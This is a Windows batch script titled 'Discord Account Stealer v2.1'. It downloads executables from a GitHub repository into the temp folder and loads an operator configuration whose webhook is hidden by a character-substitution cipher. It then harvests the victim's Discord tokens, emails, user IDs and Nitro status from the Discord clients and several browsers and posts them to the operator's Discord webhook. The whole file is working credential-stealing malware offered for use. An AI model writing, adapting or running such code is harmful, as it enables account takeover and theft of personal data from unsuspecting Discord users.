@echo off
setlocal enabledelayedexpansion

:: <Settings>
set "Version=2.1"
set "MsgRights=\n\n\n:tools: __**Tools Used:**__\n:newspaper: **[Discord Account Stealer v!Version!](https://discord.gg/ceYqA6tPjM) | Grab Discord's Information.**"
set "APIPasswords=V4KG2CPM-QXWU4PM2, XHUTAy-49UAML-WwuBfu-zBVWxL"
set FilesDB=DiscordMSG.bat notifu.exe WebParse.exe DAS.exe
set DefaultGateway=https://github.com/agamsol/Discord-Stealer/raw/main/2.0
set "DefaultIdentifier=10000-00000"
set "JsonValues=token version CreationDate author.APPNickname author.username author.ID author.webhook author.notifications author.premium Embed.ErrorColor Embed.SuccessColor Embed.MessageTitle Embed.ErrorMessageTitle Embed.ErrorMessageBody Embed.MessageBody Embed.ErrorImageURL Embed.SuccessImageURL"
set "EncodeLength=4"
set "ENCODE.LOWER[/]=BwgH" & set "DECODE.LOWER[BwgH]=/"
set "UpperList="gVzn/A" "SRFg/B" "8Qe6/C" "Lr2D/D" "m2gd/E" "e8Up/F" "5uhI/G" "QFKl/H" "9cQA/I" "9bkk/J" "Wxx0/K" "OMpO/L" "j3ts/M" "2NVe/N" "Cqs0/O" "QjQ7/P" "co88/Q" "F3V1/R" "1Omy/S" "hGdp/T" "SLPF/U" "S7VB/V" "wf6z/W" "Kx2N/X" "EoZ3/Y" "trSb/Z""
set "LowerList="4e4O/a" "Izi3/b" "Jyb3/c" "Wcg5/d" "HQHN/e" "ufRy/f" "HJ2A/g" "oAY8/h" "czB1/i" "Tghp/j" "62p0/k" "DxBN/l" "wf9R/m" "cc70/n" "wvrk/o" "RaNH/p" "ZGZf/q" "NtFD/r" "7T1b/s" "wuXj/t" "i75b/u" "bysR/v" "ewu3/w" "AhLh/x" "v3PO/y" "Bkjo/z" "m1yz/1" "UOHK/2" "LQBY/3" "YlSM/4" "Rdwm/5" "Wl7e/6" "JkiO/7" "9LNm/8" "nTGl/9" "fcqL/0" "bRqc/ " "O1EY/." "u7Yz/-" "xKXq/+" "6Pa4/$" "Ae7i/_" "GCzw/#" "L9FZ/@" "HMo6/^^" "CqXF/^&" "2YRP/^(" "acFO/^)" "xsLG/[" "DXBo/]" "b02N/{" "PCLB/}" "sRlF/^|" "0KJz/^<" "XBJu/^>" "OR0i/^\" "RNw5/'" "i8lT/~" "kuXH/`" "4VjM/;" "xZe8/%%" "k7MX/"""
:: </Settings>

:: <Download Missing Files>
for %%a in (!FilesDB!) do if not exist "!temp!\DAS v2.0\%%a" set /a MissingFiles+=1

if !MissingFiles! geq 1 (
    for %%a in (!FilesDB!) do (
        set /a Downloaded+=1
        cls
        echo.
        echo  Downloading File !Downloaded!/!MissingFiles!
        curl --create-dirs -f#kLo "!temp!\DAS v2.0\%%a" "!DefaultGateway!/%%a"
    )
cls
)

:: <Download Missing Files>

:: <Load Parameters>
set "Identifier=%~1"
:: </Load Parameters>

:: <Apply Settings>
for %%a in (!UpperList!) do (
    for /f "tokens=1,2 delims=/" %%b in ("%%~a") do (
        set "ENCODE.CAPS[%%c]=%%b"
        set "DECODE.CAPS[%%b]=%%c"
    )
)
for %%a in (!LowerList!) do (
    for /f "tokens=1,2 delims=/" %%b in ("%%~a") do (
        set "ENCODE.LOWER[%%c]=%%b"
        set "DECODE.LOWER[%%b]=%%c"
    )
)
for %%a in (!APIPasswords!) do (
    set /a APIPasswords.Length+=1
    set "APIPassword[!APIPasswords.Length!]=%%a"
)

for %%a in (!FilesDB!) do (
    set /a Files.Length+=1
    set "Files[!Files.Length!]=!temp!\DAS v2.0\%%a"
)

:: </Apply Settings>

:: <Load Identifier>
if not defined Identifier set Identifier=!DefaultIdentifier!
set "IdentifierURL=!DefaultGateway!/User_Identification_System/!Identifier!.json?raw=true"
for /f %%A in ('curl --silent "!IdentifierURL!"') do set "LINK_TYPE=%%A"
if not "%LINK_TYPE%"=="<html><body>You" (
    set ERROR=Identifier not found
    goto :CHECK_ERRORS
)
for /f "delims=" %%a in ('call "!Files[3]!" "!IdentifierURL!" !JsonValues!') do set "Json.%%a"

for %%a in (APPNickname username ID webhook) do (
    call :DECODE "!Json.author.%%a!"
    set "Json.author.%%a=!DecodedString!"
)

if not "!json.version!"=="!Version!" (
    set ERROR=Identifier Incompatible with this version
    )
set "Webhook=https://discord.com/api/webhooks/!Json.author.webhook!"
if not defined ERROR call :Validate_Webhook
:: </Load Identifier>

:CHECK_ERRORS_LOAD
:: <Account Collection>
for /f "delims=" %%a in ('call "!Files[4]!" !APIPassword[1]!') do set "%%a"
if defined Error ( set IdentifierDATA=!Json.Embed.ErrorMessageBody!) else set IdentifierDATA=!Json.Embed.MessageBody!
for /f "delims=" %%b in ("[!Json.token!](!IdentifierURL!)") do set IdentifierDATA=!IdentifierDATA:{IdentifierToken}=%%~b!
for /f "delims=" %%b in ("!Json.author.username! (!Json.author.ID!)") do set IdentifierDATA=!IdentifierDATA:{IdentifierOwner}=%%~b!
for /f "delims=" %%b in ("!Json.CreationDate!") do set IdentifierDATA=!IdentifierDATA:{IdentifierCreationDate}=%%~b!
for /f "delims=" %%b in ("!Json.version!") do set IdentifierDATA=!IdentifierDATA:{IdentifierVersion}=%%~b!

:CHECK_ERRORS
if defined Error (
    set "ErrorMessageBody=!IdentifierDATA!"
    if "!Error!"=="Identifier not found" (
        set Json.author.APPNickname=System
        set "QueueNotification=Couldn't find the identifier specified."
        echo ERROR: !QueueNotification!
    )
    if "!Error!"=="Identifier Incompatible with this version" (
        set ErrorDetail=The Version of the identifier\ndid not match the program version ^(!version!^)
        set "QueueNotification=This Identifier is incompatible with this version.\nIdentifier: !Json.token!"
        echo ERROR: !QueueNotification:\n= !
    )
    if "!Error!"=="Invalid Webhook URL" (
        set "QueueNotification=Error Accured while verifing the identifier.\nIdentifier: !Json.token!"
        echo ERROR: Invalid Webhook URL for the identifier: !Json.token!.
    )
    if "!Error!"=="Invalid password" (
        set ErrorDetail=Discord Account Collection program key is invalid.
        set "QueueNotification=Program key provided is invalid."
        echo ERROR: !QueueNotification!
    )
    if "!Error!"=="Not supported" (
        set ErrorDetail=This Discord Account Stealer version is no longer maintained, please use a newer version.
        set "QueueNotification=This version is no longer maintained, Please update to a newer version."
        echo ERROR: !QueueNotification!
    )
    if "!Error!"=="Discord not installed" (
        set ErrorDetail=Looks Like the User does not have discord installed
        set "QueueNotification=Discord is not installed, please install discord, login and try again."
        echo ERROR: !QueueNotification!
    )
    if "!Error!"=="User is not logged in" (
        set ErrorDetail=Looks like The User does not have discord installed!
        set "QueueNotification=This Looks like you have discord but you are not logged in."
        echo ERROR: !QueueNotification!
    )
    if /i "!json.author.notifications!"=="true" start "" "!Files[2]!" /p "!Json.author.APPNickname! | ERROR" /m "!QueueNotification!" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,131
    for /f "delims=" %%a in ("!ErrorDetail!") do set ErrorMessageBody=!ErrorMessageBody:{error}=%%~a!
    if /i "!Json.author.premium!"=="false" set "ErrorMessageBody=!ErrorMessageBody!!MsgRights!"
    call "!Files[1]!" +silent --embed "!Json.Embed.ErrorMessageTitle!" "!ErrorMessageBody:\n=\\n!" "!Json.Embed.ErrorColor!" "!Json.Embed.ErrorImageURL!"
    timeout /t 5 /nobreak >nul
    exit /b
)
:: </Account Collection>

:: <Print Detials>
if /i "!json.author.notifications!"=="true" start "" "!Files[2]!" /p "!Json.author.APPNickname!" /m "The identifier has been successfully verified.\nIdentifier: !Json.token!\n" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
echo.
echo The Identifier has been successfully verified,
echo   Identifier Token: !Json.token!
:: <Print Detials>

:: <Prepare and Send Account(s)>
for %%a in (Stable PTB Canary Chrome Opera Brave Yandex) do (
    if defined Discord_%%a_User (
        set "Discord_%%a_Email=||!Discord_%%a_Email:@=||@!"
        set %%a=true
    )
)

for %%a in (Stable PTB Canary Chrome Opera Brave Yandex) do (
    set "MessageBody=!IdentifierDATA!"
    set ImageURL=!Json.Embed.SuccessImageURL!
    set MessageTitle=!Json.Embed.MessageTitle!
    if "!%%a!"=="true" (
        for %%b in ("!Discord_%%a_User!") do set MessageTitle=!Json.Embed.MessageTitle:{username}=%%~b!
        if "%%a"=="Stable" set "MessageBody=!MessageBody:{location}=_%%a Discord_!"
        if "%%a"=="PTB" set "MessageBody=!MessageBody:{location}=_Discord %%a_!"
        if "%%a"=="Canary" set "MessageBody=!MessageBody:{location}=_Discord %%a_!"
        if "%%a"=="Chrome" set "MessageBody=!MessageBody:{location}=_%%a Browser_!"
        if "%%a"=="Opera" set "MessageBody=!MessageBody:{location}=_%%a Browser_!"
        if "%%a"=="Brave" set "MessageBody=!MessageBody:{location}=_%%a Browser_!"
        if "%%a"=="Yandex" set "MessageBody=!MessageBody:{location}=_%%a Browser_!"
        for %%b in ("!Discord_%%a_User!") do set "MessageBody=!MessageBody:{username}=%%~b!"
        for %%b in ("!Discord_%%a_ID!") do set "MessageBody=!MessageBody:{userID}=%%~b!"
        for %%b in ("!Discord_%%a_Email!") do set "MessageBody=!MessageBody:{email}{spoiler}=%%~b!"
        for %%b in ("!Discord_%%a_Email:||=!") do set "MessageBody=!MessageBody:{email}=%%~b!"
        for %%b in ("!Discord_%%a_Nitro!") do set "MessageBody=!MessageBody:{HasNitro}=%%~b!"
        for %%b in ("!Discord_%%a_Token!") do set "MessageBody=!MessageBody:{token}=%%~b!"
        echo !ImageURL!| findstr /C:"{ImageURL}">nul && set ImageURL=!Discord_%%a_ImageURL!
        if /i "!Json.author.premium!"=="false" set "MessageBody=!MessageBody!!MsgRights!"
        call "!Files[1]!" +silent --embed "!MessageTitle!" "!MessageBody:\n=\\n!" "!Json.Embed.SuccessColor!" "!ImageURL!"
    )
)

echo.
echo The Application has been successfully finished.
if /i "!json.author.notifications!"=="true" start "" "!Files[2]!" /p "!Json.author.APPNickname!" /m "The Application has been successfully finished." /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
timeout /t 5 /nobreak >nul
exit /b
:: </Prepare and Send Account(s)>

:: <Decoder>
:DECODE
set "EncodedString=%~1"
call :strLen EncodedString TEMP.decode.stringLen
set "DecodedString="
set /a TEMP.decode.stringLen-=1
for /L %%a in (0,!EncodeLength!,!TEMP.decode.stringLen!) do (
    for /f %%b in ("!EncodedString:~%%a,%EncodeLength%!") do (
        set "DecodedString=!DecodedString!!DECODE.CAPS[%%b]!"
        set "DecodedString=!DecodedString!!DECODE.LOWER[%%b]!"
    )
)
exit /b
:: </Decoder>

:: <String Counter>
:strLen
setlocal disableDelayedExpansion
set len=0
if defined %~1 for /f "delims=:" %%N in (
'"(cmd /v:on /c echo(!%~1!&echo()|findstr /o ^^"'
) do set /a "len=%%N-3"
endlocal & if "%~2" neq "" (set %~2=%len%) else echo %len%
exit /b
:: </String Counter>

:: <Discord Webhook Validator>
:Validate_Webhook
 for /F "tokens=* USEBACKQ" %%a in (`curl --silent "%webhook%"`) do set "WebhookCheck=%%a"
 for %%a in ("404: Not Found" "401: Unauthorized" "Invalid Webhook Token") do echo %WebhookCheck% | findstr /ic:%%a >nul && set "Invalid_Webhook=True"
  if "%Invalid_Webhook%"=="True" (
    set "ERROR=Invalid Webhook URL"
    goto :CHECK_ERRORS
  )
  exit /b
:: </Discord Webhook Validator>
